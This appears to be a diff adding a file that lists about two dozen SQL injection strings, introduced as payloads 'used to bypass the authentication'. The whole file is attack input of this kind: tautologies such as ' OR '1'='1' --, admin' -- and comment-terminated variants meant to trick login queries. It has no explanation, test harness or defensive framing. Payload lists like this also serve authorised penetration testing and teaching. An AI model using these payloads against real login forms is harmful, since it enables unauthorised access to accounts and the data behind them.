@@ -1,0 +1,28 @@
+Those all payloads are used to bypass the authentication :~
+
+Payloads :~
+
+' OR '1'='1' --
+' OR '1'='1' #
+' OR '1'='1'/*
+admin' --
+admin' #
+admin'/*
+' OR 1=1 --
+' OR 1=1#
+' OR 1=1/*
+' OR 'a'='a
+') OR ('a'='a
+' OR ''='
+' OR '' LIKE '
+' OR 2>1 --
+' OR '2'>'1
+' OR 'x'='x
+' OR 1=1 LIMIT 1 --
+' OR 1=1 ORDER BY 1--
+' OR 1=1 ORDER BY 2--
+' OR '1'='1' AND '1'='1
+' OR NOT '1'='2
+' OR 1 IN (1,2,3)
+' OR 1 BETWEEN 1 AND 1
+' OR EXISTS(SELECT 1)
